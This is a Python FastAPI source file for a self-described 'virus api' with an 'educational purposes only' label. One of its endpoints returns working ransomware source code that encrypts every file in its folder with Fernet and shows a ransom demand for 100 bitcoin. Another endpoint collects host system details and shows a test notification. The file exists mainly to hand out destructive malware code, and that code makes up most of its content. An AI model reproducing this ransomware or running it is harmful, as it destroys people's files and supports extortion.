from fastapi import FastAPI


app = FastAPI()

@app.get('/')
def home():
    return {'message': 'This is the home page for my virus api',
            'warning': 'This should be used for educational purposes only.',
            'code': """with open('liscence.txt', 'w') as liscence_file:
    liscence_file.write('By using this api you agree to the terms and conditions of the code')"""}

@app.get('/get-code')
def getCode():
    return {'code': """import platform
from plyer import notification
operatingSystem = platform.uname().system
architecture = platform.uname().processor
comp_name = platform.uname().node
linux_Kernel = platform.uname().release
notification.notify(
    app_name = 'script', 
    title = 'app',
    message = 'it worked'
)
"""}
    
@app.get('/get-ransomeware')
def getRansomware():
    return {'code': """import os
from cryptography.fernet import Fernet
from plyer import notification

files =[]
if "thekey.key" not in os.listdir():
    for file in os.listdir():
        if file == "app.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
        
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    
    notification.notify(
        app_name = 'Encrypter',
        title ='Oops! Something went wrong',
        message = "Files have been encrypted hahaha, send 100 bitcoin to xxxxxxxxxx"
    )


else:
    notification.notify(
        app_name = 'Encrypter',
        title ='Oops! Something went wrong',
        message = "the files seem to be encrypted, send 100 bitcoin to xxxxxxxxxx"
    )
    print('the files seem to be encrypted')"""}
    
    
